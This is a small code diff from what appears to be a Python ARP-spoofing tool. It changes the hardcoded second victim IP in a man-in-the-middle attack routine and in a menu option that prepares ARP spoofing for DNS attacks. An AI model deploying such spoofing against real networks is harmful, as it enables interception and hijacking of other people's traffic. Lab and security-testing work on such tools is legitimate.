@@ -50,7 +50,7 @@ def begin():
 			DuckForce = True
 		else: DuckForce = False
 		
-		arp_attack = ARPSpoof(interface_config = 'eth0', victim1_ip = Victim1_ip, victim2_ip ="192.168.56.102", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
+		arp_attack = ARPSpoof(interface_config = 'eth0', victim1_ip = Victim1_ip, victim2_ip ="10.0.2.1", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
 		try: 
 			while True:
 				arp_attack.start_attack()
@@ -69,7 +69,7 @@ def begin():
 	elif attack_to_perform == "2":
 		print("\n \nSet your Victim's IP Address")
 		Victim1_ip= input()
-		arp_attack_4dns = ARPSpoof(victim1_ip = Victim1_ip, victim2_ip ="192.168.56.103", mitm =False,restore= True,duckforce= True)
+		arp_attack_4dns = ARPSpoof(victim1_ip = Victim1_ip, victim2_ip ="10.0.2.1", mitm =False,restore= True,duckforce= True)
 		#arp_attack_4dns.start_attack()
 		#try: 
 		#	while True:
